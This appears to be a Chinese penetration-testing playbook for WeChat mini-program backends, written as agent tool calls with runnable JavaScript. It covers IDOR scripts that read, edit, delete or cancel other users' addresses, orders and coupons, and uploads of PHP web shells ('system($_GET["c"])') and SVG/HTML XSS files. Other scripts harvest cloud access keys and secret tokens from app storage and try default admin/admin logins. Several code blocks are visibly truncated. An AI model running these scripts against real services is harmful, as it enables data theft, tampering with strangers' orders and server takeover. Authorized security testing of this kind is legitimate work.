// POST /lyanxue/api/v1.2/app/trade/delivery/add-receiver
// Body: {"deliveryIds":"","name":"test","phone":"19555555555","address":"浙江省杭州市西湖区test","timestamp":1779688689599}
//
// deliveryIds: 空字符串 = 新建收货人（无关联订单）
// deliveryIds: "123,456" = 关联订单 123 和 456 的收货人
//
// IDOR 测试重点：deliveryIds 使用他人订单 ID → 修改他人订单收货地址

runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN')||wx.getStorageSync('token');
  var base='https://<API域名>';
  var ts=Date.now();
  // Step 1: 先获取自己的 delivery list 拿到 deliveryIds
  var deliveries=await new Promise(res=>{wx.request({
    url:base+'/lyanxue/api/v1.2/app/trade/delivery/get-list?pageNo=1&pageSize=10&lockedStates=0&timestamp='+ts,
    method:'GET',header:{token:token},
    success:r=>res(r.data&&r.data.data&&r.data.data.deliveryList||[]),
    fail:e=>res([])
  })});
  console.log('[DELIVERIES]'+JSON.stringify(deliveries).slice(0,500));

  // Step 2: 用相邻 ID 测试 add-receiver（IDOR 核心）
  var myDeliveryId=deliveries[0]&&deliveries[0].id;
  var testIds=myDeliveryId?[myDeliveryId-2,myDeliveryId-1,myDeliveryId,myDeliveryId+1,myDeliveryId+2]:[1,2,3,100];
  var results=[];
  for(var id of testIds){
    var r=await new Promise(res=>{wx.request({
      url:base+'/lyanxue/api/v1.2/app/trade/delivery/add-receiver',
      method:'POST',header:{token:token,'Content-Type':'application/json'},
      data:{deliveryIds:String(id),name:'IDOR_TEST',phone:'13800000002',address:'测试地址IDOR',timestamp:ts},
      success:r=>res({deliveryId:id,code:r.data&&r.data.code,msg:r.data&&r.data.msg,preview:JSON.stringify(r.data).slice(0,200)}),
      fail:e=>res({deliveryId:id,status:'fail'})
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 判断标准：
  他人 deliveryId → code:10000/200 → 🔴 越权修改他人订单收货人（严重！影响商品投递）
  他人 deliveryId → 403/401 → ✅ 有归属验证
  所有 deliveryId → code:0 → ⚠️ 接口存在但无数据（可能需要正确的 deliveryIds 格式）
```

#### Step 3：用自己的 addressId 枚举其他地址（IDOR 核心测试）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN');
  var base='https://<API域名>';
  var myAddressId=<Step2获取的自己的ID>;          // 如 42
  // 枚举相邻 ID（前后各 10 个）
  var testIds=[];
  for(var i=Math.max(1,myAddressId-10);i<=myAddressId+10;i++) testIds.push(i);
  testIds=[1,2,3,100,1000].concat(testIds);  // 加入极值

  var results=[];
  var getPath='/api/app/user/address/get';       // 从 Step1 接口清单中取真实路径

  for(var id of testIds){
    var r=await new Promise(res=>{wx.request({
      url:base+getPath+'?id='+id,method:'GET',
      header:{token:token,platform:'mp-weixin'},
      success:function(r){
        var d=r.data&&r.data.data;
        res({id:id,code:r.data&&r.data.code,
          hasData:!!(d&&Object.keys(d).length),
          name:d&&(d.name||d.receiverName||''),
          phone:d&&(d.phone||d.mobile||d.tel||''),
          detail:d&&(d.detail||d.address||d.fullAddress||''),
          preview:JSON.stringify(d).slice(0,300)});
      },
      fail:function(e){res({id:id,status:'fail'})}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 判断标准：
  id=自己ID → code:200 有数据 → BASELINE（正常）
  id=他人ID → code:200 + name/phone/detail 与自己不同 → 🔴 IDOR 确认
  id=他人ID → code:200 + 空数据 {} → ⚠️ 服务端用 token 过滤（正常防御）
  id=随机ID → code:403/401 → ✅ 有鉴权
```

#### Step 4：修改/删除他人地址（写越权，危害更大）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN');
  var base='https://<API域名>';
  var targetId=<他人的addressId>;   // 从Step3中找到的他人地址ID

  var tests=[
    // 修改越权
    {label:'edit_other',method:'PUT',path:'/api/app/user/address/edit',
     data:{id:targetId,name:'HACKED',phone:'13900000001',detail:'越权修改的地址'}},
    // 设为默认（可能影响他人下单行为）
    {label:'set_default',method:'PUT',path:'/api/app/user/address/default',
     data:{id:targetId}},
    // 删除越权
    {label:'delete_other',method:'DELETE',path:'/api/app/user/address/delete?id='+targetId,
     data:{}},
    // POST 方式删除（部分接口用 POST）
    {label:'delete_post',method:'POST',path:'/api/app/user/address/delete',
     data:{id:targetId}},
  ];

  var results=[];
  for(var t of tests){
    var r=await new Promise(res=>{wx.request({
      url:base+t.path,method:t.method,
      header:{token:token,'Content-Type':'application/json',platform:'mp-weixin'},
      data:t.data,
      success:function(r){res({label:t.label,code:r.data&&r.data.code,
        msg:r.data&&r.data.msg,preview:JSON.stringify(r.data).slice(0,200)})},
      fail:function(e){res({label:t.label,status:'fail'})}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 判断标准：
  edit_other code:200 → 🔴 越权修改他人地址（严重）
  delete_other code:200 → 🔴 越权删除他人地址（严重）
  set_default code:200 → 🔴 越权修改他人默认收货地址（影响订单投递）
  所有操作返回 403/401 → ✅ 服务端验证地址归属
```

---

### 2.4.B 订单越权测试（v2.8 新增 — 不支付也能测越权）

**核心原则：不需要实际支付，只需要提交订单（状态=待支付）拿到 orderId，再用该 ID 对其他订单做读取/取消/改价测试。资金类操作遵守红线：build_replay_plan 只生成计划，不实际发出支付请求。**

#### Step 1：导航订单页采集真实接口

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{wx.navigateTo({url:'/pages-sub/order/order'});return 'ok'})()")
// 也导航到订单详情（通常有 orderId 参数）
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{wx.navigateTo({url:'/pages-sub/orderDetail/orderDetail?id=1'});return 'ok'})()")
// 收集真实订单 API 路径
analysis_ops(action="find_payment_and_order_surfaces")
→ 识别: trade/get-list, trade/get, trade/cancel, order/add, order/pay, cashier 等
→ 特别注意含 id/orderId/tradeId/no 参数的 GET/POST 接口
```

#### Step 2：提交测试订单（不支付，仅拿到 orderId）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN');
  var base='https://<API域名>';

  // 先获取可购买的商品列表（找一个最便宜的商品）
  var prodR=await new Promise(res=>{wx.request({
    url:base+'/api/app/product/get-list?pageNo=1&pageSize=5',method:'GET',
    header:{token:token,platform:'mp-weixin'},
    success:function(r){res(r.data&&r.data.data)},fail:function(e){res(null)}
  })});
  console.log('[PRODUCTS]'+JSON.stringify(prodR).slice(0,500));

  // 尝试提交订单（只提交，不支付）
  var orderPaths=[
    '/api/app/trade/add',
    '/api/app/order/add',
    '/api/app/trade/create',
    '/api/app/order/create',
    '/api/app/trade/submit',
  ];
  var results=[];
  for(var p of orderPaths){
    var r=await new Promise(res=>{wx.request({
      url:base+p,method:'POST',
      header:{token:token,'Content-Type':'application/json',platform:'mp-weixin'},
      data:{
        productId:prodR&&prodR.list&&prodR.list[0]&&prodR.list[0].id||1,
        quantity:1,
        addressId:1,       // 使用Step1添加的地址ID
        remark:'IDOR测试订单',
      },
      success:function(r){res({path:p,code:r.data&&r.data.code,
        orderId:r.data&&r.data.data&&(r.data.data.id||r.data.data.orderId||r.data.data.tradeId||r.data.data.no),
        preview:JSON.stringify(r.data).slice(0,400)})},
      fail:function(e){res({path:p,status:'fail'})}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")
→ 记录成功的 orderId / tradeId（此时订单状态为待支付，不会实际扣款）
→ ⚠️ 红线：不发起支付请求，只记录 ID
```

#### Step 3：用自己的 orderId 读取/枚举他人订单（IDOR）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN');
  var base='https://<API域名>';
  var myOrderId=<Step2获取的自己订单ID>;   // 如 10086

  // 枚举相邻 ID + 极值
  var testIds=[1,2,3,100];
  for(var i=Math.max(1,myOrderId-5);i<=myOrderId+5;i++) testIds.push(i);

  var getPath='/api/app/trade/get';     // 从接口清单取真实路径，也试 order/get/orderDetail/get
  var results=[];
  for(var id of testIds){
    var r=await new Promise(res=>{wx.request({
      url:base+getPath+'?id='+id,method:'GET',
      header:{token:token,platform:'mp-weixin'},
      success:function(r){
        var d=r.data&&r.data.data;
        res({id:id,code:r.data&&r.data.code,
          hasData:!!(d&&Object.keys(d||{}).length),
          userId:d&&(d.userId||d.buyerId||d.memberId||''),
          amount:d&&(d.amount||d.totalPrice||d.payAmount||''),
          status:d&&(d.status||d.tradeState||d.state||''),
          phone:d&&(d.phone||d.receiverPhone||d.mobile||''),
          preview:JSON.stringify(d).slice(0,300)});
      },
      fail:function(e){res({id:id,status:'fail'})}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 判断标准：
  他人 orderId → code:200 + 不同 userId/phone/amount → 🔴 订单 IDOR（高危）
  他人 orderId → code:200 + 空 data → ⚠️ 服务端按 token 过滤（正常）
  任意 orderId → code:403/401 → ✅ 鉴权有效
  ⚠️ 订单数据中出现他人手机号/姓名 → 🔴 同时构成敏感数据泄露
```

#### Step 4：取消他人订单（写越权）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN');
  var base='https://<API域名>';
  var otherOrderId=<Step3中找到的他人订单ID>;

  var tests=[
    // 取消越权（不涉及资金，安全操作）
    {label:'cancel_other',method:'POST',path:'/api/app/trade/cancel',data:{id:otherOrderId,reason:'测试'}},
    {label:'cancel_other2',method:'POST',path:'/api/app/order/cancel',data:{orderId:otherOrderId}},
    // 确认收货越权（伪造他人已收货）
    {label:'confirm_other',method:'POST',path:'/api/app/trade/confirm',data:{id:otherOrderId}},
    // 删除订单记录
    {label:'delete_order',method:'POST',path:'/api/app/trade/delete',data:{id:otherOrderId}},
  ];

  var results=[];
  for(var t of tests){
    var r=await new Promise(res=>{wx.request({
      url:base+t.path,method:t.method,
      header:{token:token,'Content-Type':'application/json',platform:'mp-weixin'},
      data:t.data,
      success:function(r){res({label:t.label,code:r.data&&r.data.code,msg:r.data&&r.data.msg})},
      fail:function(e){res({label:t.label,status:'fail'})}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 判断标准：
  cancel_other code:200 → 🔴 越权取消他人订单（严重）
  confirm_other code:200 → 🔴 越权伪造他人收货（严重，可触发商家发货/结算）
  delete_order code:200 → 🔴 越权删除他人订单记录（严重）
  所有操作返回 403/401 → ✅ 服务端验证订单归属
```

#### Step 5：订单价格篡改测试（客户端提交金额时）

```javascript
// ⚠️ 只生成计划，不实际发起支付。若订单提交接口含 price/amount 参数：
analysis_ops(action="build_replay_plan", request_id="<订单提交请求ID>")
  → 检查请求 body 中是否有 price/amount/totalFee/goodsPrice 等客户端可控价格参数
  → 若有 → 🔴 CRITICAL：客户端价格注入风险，1分钱买任意商品
  → 生成修改方案（price 改为 0.01）但 **不自动发送**

// 判断：服务端是否用 productId 重新查价
// 安全做法：服务端按 productId 查数据库价格，忽略客户端 price 参数
// 不安全做法：服务端直接用客户端传入的 price 字段
```

#### Step 6：优惠券/积分越权使用

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN');
  var base='https://<API域名>';

  // 获取自己的优惠券列表（找到 couponId）
  var coupons=await new Promise(res=>{wx.request({
    url:base+'/api/app/coupon/user/coupon/get-list?states=&pageNo=1&pageSize=10',
    method:'GET',header:{token:token,platform:'mp-weixin'},
    success:function(r){res(r.data&&r.data.data&&r.data.data.couponList||[])},
    fail:function(e){res([])}
  })});
  console.log('[MY_COUPONS]'+JSON.stringify(coupons).slice(0,500));

  // 枚举其他 couponId（相邻值）
  var myCouponId=coupons[0]&&coupons[0].id;
  if(!myCouponId) return '没有可用优惠券，跳过';

  var testIds=[1,2,3,myCouponId-1,myCouponId,myCouponId+1,myCouponId+2];
  var results=[];
  for(var id of testIds){
    var r=await new Promise(res=>{wx.request({
      url:base+'/api/app/coupon/user/coupon/get?id='+id,method:'GET',
      header:{token:token,platform:'mp-weixin'},
      success:function(r){
        var d=r.data&&r.data.data;
        res({id:id,code:r.data&&r.data.code,
          userId:d&&(d.userId||d.memberId||''),
          discount:d&&(d.discount||d.discountAmount||d.value||''),
          status:d&&(d.status||d.state||''),
          preview:JSON.stringify(d).slice(0,300)});
      },
      fail:function(e){res({id:id,status:'fail'})}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 他人 couponId → code:200 + 不同 userId → 🔴 优惠券 IDOR，可使用他人券
→ 下单时传入他人 couponId 且服务端不验证归属 → 🔴 免费薅券
```

### 2.5 其他风险面

```
analysis_ops(action="find_debug_admin_surfaces")
  → debug/admin/test/internal 路由

analysis_ops(action="find_sign_related_requests")
  → 含签名/时间戳/nonce 的接口（重放风险候选）
  → 对比同一接口多次请求的 sign 变化因子
```

### 2.5.A 上传点深度测试（v2.8 新增 — 不能只靠被动捕获）

```javascript
// 在 Phase 0 hook_wx_request 之后立即注入，确保捕获所有后续上传
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
      return orig.apply(this,arguments);
    };
  })()")
```

#### Step 1.5：从已捕获流量中查找上传 URL（Hook 未触发时的备用方案）

```javascript
network_ops(action="get_all_requests")

// 方法二：从 DNS prefetch 推断上传域名和 bucket
// 导航到任意页面后，检查 page-frame.html 中的 dns-prefetch 标签
// 常见 OSS 相关 prefetch：
//   lyanxue.oss-cn-hangzhou.aliyuncs.com → Aliyun OSS bucket = "lyanxue"
//   zglyxoss.zmg.com.cn:8443             → 自定义 OSS 域名
//   yljlb-oss.zmg.com.cn:9443            → 另一自定义 OSS

// 方法三：从网络请求 Host 头推断
// 真实上传请求特征：
//   - Method: POST
//   - Headers: token / Authorization（认证）
//   - Body: formData 含 timestamp 字段

```

> **文件名格式注意**：很多小程序使用时间戳作为文件名，格式为 `{timestamp}.{ext}`，例如：

#### Step 2：主动导航上传页面（关键 — 按路由关键词逐一触发）

| 路由关键词 | 典型上传场景 |
|-----------|------------|
| `person / user / account / myInfo` | 用户头像上传 |
| `editInfo / profile / edit` | 个人资料图片 |
| `publishMoments / post / release` | 发帖多图 / 视频 |
| `zone / community / circle` | 社区发布图片 |
| `activity/apply / applyList` | 活动报名证件照 |
| `kyc / verify / identity / realName` | 实名认证证件 |
| `feedback / complaint / report` | 投诉截图 |
| `live / livePlayer` | 直播封面/横幅 |
| `editDealerTrade / salesTradeList` | 经销商合同图片 |
| `album / photo / cloudAlbum` | 相册多图 |
| `product / goods / item` | 商品图片（商家端）|

```javascript
// 逐一导航触发，每个路由等待 2-3 秒后检查 console
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{wx.navigateTo({url:'/pages-sub/publishMoments/index'});return 'ok'})()")

// 等待后查收 Hook 日志
network_ops(action="get_all_requests")
```

#### Step 3：OSS 前端直签检测（CRITICAL 级别风险）

```javascript
// 检查 Storage 中是否有 STS Token 或前端直签凭证
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    try{
      var keys=wx.getStorageInfoSync().keys;
      var r={};
      keys.filter(k=>/sts|oss|cos|cred|bucket|region|endpoint|accessKey|secretKey|securityToken/i.test(k))
        .forEach(k=>{try{r[k]=JSON.stringify(wx.getStorageSync(k)).slice(0,400)}catch(e){}});
      return JSON.stringify(r);
    }catch(e){return String(e)}
  })()")

// 检查全局变量中是否有 OSS client 实例或配置
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    var hits={};
    Object.keys(globalThis||{}).forEach(function(k){
      try{
        var v=globalThis[k];
        var s=v&&typeof v==='object'?JSON.stringify(v):'';
        if(s&&/accessKeyId|secretAccessKey|securityToken|bucket.*region|endpoint.*oss/i.test(s))
          hits[k]=s.slice(0,400);
      }catch(e){}
    });
    return JSON.stringify(hits);
  })()")

→ 发现 accessKeyId + secretAccessKey + securityToken → 🔴 STS 前端直签泄露
→ 若 securityToken 存在但 expiration 已过期 → 🟡 已失效，但说明曾泄露
→ 发现 accessKeyId 无 securityToken（永久凭证）→ 🔴 CRITICAL，长期 AK/SK 硬编码
```

#### Step 4：文件类型绕过测试（对每个上传端点）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token='<当前token>';
  var fs=wx.getFileSystemManager();
  var base=wx.env.USER_DATA_PATH;

    +'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
    +'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n'
    +'4 0 obj\n<< /Length 41 >>\nstream\nBT /F1 12 Tf 100 700 Td (Hello PDF) Tj ET\nendstream\nendobj\n'
    +'5 0 obj\n<< /S /JavaScript /JS (app.alert(\'XSS\')) >>\nendobj\n'
    +'xref\n0 6\n0000000000 65535 f\n0000000009 00000 n\n0000000076 00000 n\n'
    +'0000000133 00000 n\n0000000220 00000 n\n0000000311 00000 n\n'
    +'trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n385\n%%EOF';

  var tests=[
    // ─── PHP/后端执行类 ───
    {label:'php_as_jpg',   filename:'test.php',      mime:'image/jpeg',   content:'<?php phpinfo();?>'},
    {label:'phtml',        filename:'test.phtml',     mime:'image/jpeg',   content:'<?php system($_GET[\"c\"]);?>'},
    {label:'gif_php',      filename:'shell.gif',      mime:'image/gif',    content:'GIF89a<?php system($_GET[\"c\"]);?>'},
    {label:'double_ext',   filename:'img.php.jpg',    mime:'image/jpeg',   content:'<?php phpinfo();?>'},
    // ─── 前端 XSS 类 ───
    {label:'svg_xss',      filename:'xss.svg',        mime:'image/svg+xml',content:'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'},
    {label:'html_xss',     filename:'xss.html',       mime:'text/plain',   content:'<script>alert(document.cookie)</script>'},
    // 这意味着服务端只校验 Content-Type 不校验文件扩展名，或两者都不校验内容
    {label:'svg_mime_bypass',filename:String(Date.now())+'.svg', mime:'image/jpeg', content:'<svg><script>alert(1)</script></svg>'},
    {label:'html_mime_bypass',filename:String(Date.now())+'.html',mime:'image/jpeg',content:'<script>alert(document.cookie)</script>'},
    // ─── 基线 ───
    {label:'normal_jpg',   filename:'normal.jpg',     mime:'image/jpeg',   content:'\\xff\\xd8\\xff\\xe0normal'},
  ];

  var results=[];
  for(var t of tests){
    fs.writeFileSync(base+'/'+t.filename, t.content, 'utf8');
    var r=await new Promise(res=>{
        header:{token:token, platform:'mp-weixin'},
        formData:{fileType:'image'},
        success:function(r){
          var fileUrl=''; try{fileUrl=JSON.parse(r.data).data.fileUrl||'';}catch(e){}
          res({label:t.label,filename:t.filename,status:r.statusCode,fileUrl:fileUrl,resp:String(r.data).slice(0,300)});
        },
        fail:function(e){res({label:t.label,filename:t.filename,status:'fail',err:JSON.stringify(e)})}
      });
    });
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

→ 判断标准：
  上传成功(200) + URL 保留 .php/.phtml → 🔴 访问 URL?c=id 验证 RCE
  上传成功 + 文件被重命名为 UUID.jpg → ✅ 重命名保护
  上传成功 + .svg + URL 保留扩展名 → 🔴 浏览器 / web-view XSS
  服务端返回「文件格式不支持」→ ✅ 白名单限制
```

| 场景 | 危害 | 条件 |
|------|------|------|
| 任何渠道将 PDF 链接嵌入 `web-view` | 🔴 HIGH — webview 调用系统 PDF 阅读器 | 需 webview 支持 PDF 预览 |

#### Step 5：上传后访问验证

```javascript
// 对上传成功且 URL 保留危险扩展名的文件：
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var tests=[
    {label:'php_rce',  url:'<.php URL>?c=id'},
    {label:'svg_xss',  url:'<.svg URL>'},
  ];
  var results=[];
  for(var t of tests){
    var r=await new Promise(res=>{
      wx.request({url:t.url,method:'GET',
        success:r=>res({label:t.label,status:r.statusCode,ct:r.header&&r.header['content-type'],body:JSON.stringify(r.data).slice(0,400)}),
        fail:e=>res({label:t.label,status:'fail'})});
    });
    results.push(r);
  }
  // uid= / root: → 🔴 RCE
  // <script> 回显 → 🔴 SVG XSS
  // content-type: application/pdf → 🔴 确认 PDF 以正确类型投递，Acrobat 打开触发 JS
  return JSON.stringify(results,null,2);
})()")
```

### 2.5.1 专项风险检测（v2.5 新增）

**① JWT / Token 暴露在 URL 查询参数中**

```
# 从接口清单中过滤 URL 含 token=eyJ / access_token= / jwt= 的请求
network_ops(action="get_all_requests")
  → 筛选 url.includes('token=eyJ') 或 query 字段含 token/jwt/access_token 键
  → 风险: token 出现在服务端日志 / Nginx access log / Referer 头 / 浏览器历史
  → 定级: MEDIUM（信息泄露）→ 若 token 可直接复用则升级为 HIGH
  → 建议: token 改为 Authorization 请求头传输
```

**② 静态 / 固定 sign 值（不具备重放防护）**

```
# 判断 sign 是否为固定字符串（非计算值）
analysis_ops(action="find_sign_related_requests")
  → 对同一接口的多次请求对比 sign 字段
  → 若 sign 值完全相同（如 sign=latestLecture_daka）→ 🔴 静态 sign，重放无阻碍
  → 若 sign 随 timestamp 变化 → 进一步检查 timestamp 窗口长度
  → 若多次请求 sign 不同但 nonce 相同 → 🔴 nonce 未一次性校验
```

**③ 路径双斜杠异常（`/path//endpoint`）**

```
# 在已采集请求中搜索双斜杠路径
network_ops(action="get_all_requests")
  → 筛选 url 含 '//' 且不是协议头 '://' 的请求
  → 风险: 部分服务器对 /path//endpoint 和 /path/endpoint 路由逻辑不同
          可能绕过中间件认证（如 Spring Security / Nginx location 规则）
  → 测试: 同时发送标准路径和双斜杠路径，对比响应差异
```

**④ enc 绑定模式识别（context-bound request signature）**

```
# enc 参数特征: 32位 hex（MD5 长度），出现在多个不同接口的 query/body 中
# enc 绑定上下文，无法跨 session 复用（更换 token 则 enc 失效）
# 识别方式：
#   1. enc 出现在多个接口且长度固定（32位）
#   2. 更换 Authorization/auth-token → 相同 enc 返回"加密校验失败"
#   3. 清空/伪造 Authorization 但 enc 不变 → 仍返回"加密校验失败"
# 结论: enc 与 token 共同构成双因子请求签名，IDOR 测试需在同一 session 内完成
# 突破思路:
#   → 优先从运行时 Storage 提取当前有效 token + enc（见场景 3）
#   → 使用 hook_wx_request 捕获下一次真实请求中的完整 headers（含 enc 原值）
```

**⑤ 多 appId 同属一个评估目标（不需要分开评估）**

```
# 核心原则：同一 WeChat 会话中出现的多个 appId，均属同一小程序产品线（同一开发者），
# 共同构成评估目标。不同 appId 只是前端入口不同，后端 API 服务器通常共享。
# → 不需要为每个 appId 单独开展独立的 Phase 0-6 评估
# → 只需记录每个 appId 对应的认证机制，然后统一在当前 session 内测试所有接口

# Step 1: 识别所有 appId（从 Referer 头解析）
network_ops(action="get_all_requests")
  → 提取 request_headers.Referer
  → 正则匹配: servicewechat\.com\/([a-z0-9]{16,18})\/
  → 得到 appId 列表，如: [wx83e9ba48, wx5636748e, wxf19adc6d]

# Step 2: 确认同属一个产品（验证后端域名重叠）
# 若不同 appId 的请求指向相同 API 域名 → 确认同一产品生态，全部纳入范围
# 若后端域名完全不同 → 可能是不同业务，需向委托方确认授权范围

# Step 3: 按认证体系分类（而非按 appId 分类）
# 不要按 appId 建立分析筒仓，而是按认证类型建立统一的接口清单：
#   Bearer JWT 系: /v2/userinfor/... + /v2/wechat/...  (Authorization header)
#   Token+Sign 系: /yin/applet/...                     (auth-token + Authen-Sign)
#   Cookie 系:    /api-zd-wap/...                      (Cookie header)
#   enc 参数系:   /wx/lecture/... + /cx/recommend/...  (enc query param)

# Step 4: 统一执行 Phase 2 全套分析，覆盖所有认证系的接口
analysis_ops(action="get_api_inventory")     → 不按 appId 过滤，全量分析
analysis_ops(action="find_idor_candidates")  → 跨 appId 寻找 IDOR
analysis_ops(action="analyze_auth_surface")  → 覆盖所有认证机制
```

**⑥ Authen-Sign 复合签名头识别与分析（v2.6 新增）**

```
# Authen-Sign 格式（常见于医疗/政务类小程序后端）：
# {user-uuid},{timestamp-ms},{base64(md5_hash)},{platform}
# 示例: fa7a24fe-ba43-4636-84cf-87b22e77d025,1779600226434,Y2M2MDg1MT...,miniprogram
#
# 各段含义：
#   Part 1 (UUID):       用户/设备标识（不随请求变化）
#   Part 2 (timestamp):  毫秒时间戳（服务端验证时效窗口）
#   Part 3 (base64):     base64(MD5(something)) — 完整性 hash，32字节
#   Part 4 (platform):   固定字符串 "miniprogram" / "h5" / "web"
#
# 安全评估要点：
#   1. 时效窗口: 对比两次请求的 timestamp 差值 → 若超过 5 分钟仍有效 → 重放窗口过长
#   2. Part3 hash 算法: 用 decrypt_ops(action="decode_base64") 解码后看是否为 32 位 hex
#      → 若是 MD5 格式，尝试碰撞: MD5(uuid), MD5(uuid+timestamp), MD5(token) 等
#   3. UUID 是否与 uid 相关: 若 UUID = MD5(uid) 或 UUID 可通过 uid 推算 → IDOR 风险
#   4. 测试无 Authen-Sign 时的响应: 若返回 500 而非 401/403 → 服务端存在错误处理缺陷

# 捕获真实 Authen-Sign（用于重放测试）：
network_ops(action="hook_wx_request")
  → 触发下一次包含 Authen-Sign 的请求
  → network_ops(action="get_all_requests") 获取最新请求的完整 headers
  → 提取 Authen-Sign 原值，在时效窗口内重用于 IDOR 测试
```

### 2.6 接口参数 Fuzz 建议

```
analysis_ops(action="passive_param_fuzz_suggestions", request_id="<id>")
  → 按参数类型生成 Fuzz 建议（只建议，不自动发送）:
    ├─ 数字参数 → 负数/零/极大值/浮点数/字符串
    ├─ 字符串参数 → XSS payload/SQL 注入探测/路径遍历
    ├─ 枚举参数 → 越界值/空值/null
    └─ JSON body → 类型混淆/原型污染探测
```

### 2.7 重放与对比

```
analysis_ops(action="build_replay_plan", request_id="<id>")
  → 生成人工重放测试计划（只生成，不自动发送）

# 签名重放验证：
analysis_ops(action="compare_two_requests", request_id_a="<同一接口请求1>", request_id_b="<同一接口请求2>")
  → 对比 sign/timestamp/nonce 的差异和绑定关系
  → 判断: 签名是否绑定请求体？timestamp 窗口多长？nonce 是否一次性？
```

---

### 2.8 HTTP 响应码行为变化检测（v2.7 新增）

**核心思路：通过向已知敏感端点（传统登录接口、文件上传端点、CVE 路径）发送探测请求，根据 HTTP 响应码组合推断安全策略演进和架构迁移，在深入逆向前先建立完整行为地图。**

```
HTTP 响应码行为变化矩阵：
├─ 默认口令登录尝试   → 404          ← 认证已迁移至 OAuth2/OIDC，原端点下线
├─ 文件上传接口探测   → 404          ← 功能下线或路径迁移
├─ 路径遍历 CVE 探针  → 404          ← 漏洞已修补（路径不存在）
│                     → WAF 418      ← WAF 主动拦截（商业 WAF 特征码）
└─ 带路由参数端点     → HTTP 200     ← REST 路由存活，行为变化（IDOR 高价值面）
```

**① 认证机制迁移探测（传统登录 → OAuth2）**

```
# Step 1: 批量探测传统登录端点存活性
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var paths=[
    '/login','/api/login','/api/auth/login','/api/user/login',
    '/api/v1/login','/api/v2/login','/auth/login','/user/login',
    '/api/token','/oauth/token','/api/signin','/api/users/login'
  ];
  var results=[];
  for(var p of paths){
    var r=await fetch(p,{method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:'admin',password:'admin'})});
    results.push({path:p,status:r.status});
  }
  return JSON.stringify(results,null,2);
})()")
```

| 状态码 | 含义 | 后续操作 |
|--------|------|---------|
| **404** | 端点下线 → 认证已迁移 | 执行步骤 2 发现 OAuth2 端点 |
| **302 → /oauth/** | OAuth2 迁移确认 | 分析授权流程，测试 redirect_uri 绕过 |
| **401** / **400** | 端点存活，凭据验证失败 | 进行弱口令 / 默认口令测试 |
| **200** + token 字段 | 🔴 弱口令命中 | 提取 token，测试越权 |
| **429** | 速率限制生效 | ✅ 防暴力破解有效；记录限制强度 |

```
# Step 2: OAuth2 / SSO 端点发现（传统登录返回 404 后执行）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var oauthPaths=[
    '/.well-known/openid-configuration',
    '/oauth/authorize','/oauth/token','/connect/token',
    '/sso/login','/cas/login','/saml/login',
    '/api/oauth2/token','/auth/oauth/token'
  ];
  var results=[];
  for(var p of oauthPaths){
    var r=await fetch(p);
    if(r.status!==404) results.push({path:p,status:r.status});
  }
  return JSON.stringify(results,null,2);
})()")
```

> ⚠️ **迁移盲区**：旧端点 404 不等于认证完全安全。检查：1) Storage 中是否存有旧 token；2) 旧 API 版本（/v1/ vs /v2/）是否同步迁移；3) refresh_token 接口是否仍接受旧格式凭据。

**② 文件上传接口存活检测**

```
# GET + POST 双探文件上传端点
runtime_ops(action="runtime_eval", expression="(async ()=>{
    '/avatar','/api/avatar','/import','/api/import',
    '/attach','/api/attach'
  ];
  var token='<当前token>';
  var results=[];
    var g=await fetch(path,{method:'GET',
      headers:{'Authorization':'Bearer '+token}});
    var fd=new FormData();
    fd.append('file',new Blob(['test'],{type:'text/plain'}),'test.txt');
    var p=await fetch(path,{method:'POST',
      headers:{'Authorization':'Bearer '+token},body:fd});
    if(g.status!==404||p.status!==404)
      results.push({path:path,GET:g.status,POST:p.status});
  }
  return JSON.stringify(results,null,2);
})()")
```

| GET | POST | 含义 | 后续操作 |
|-----|------|------|---------|
| **404** | **404** | 端点完全下线 | 跳过；检查流量中是否有云 OSS 直传签名请求 |
| **404** | **200/400** | 仅接受 POST | 进行文件上传漏洞测试 |
| **405** | **200/400** | 端点存活，GET 不被允许 | 进行文件上传漏洞测试 |
| **401/403** | **401/403** | 需要认证 | 带有效 token 重测 |
| **200/201** | **200/201** | 端点存活 | 测试扩展名 / Content-Type / Magic Bytes 三层绕过 |

> 发现存活上传端点后，按以下优先级测试：`.php/.phar/.php5` 扩展名 → Content-Type 伪造（`image/gif`）→ Magic Bytes 文件头（`GIF89a<?php system($_GET['cmd']); ?>`）→ 双扩展名（`shell.php.gif`）→ 上传成功后访问文件路径确认是否可执行。

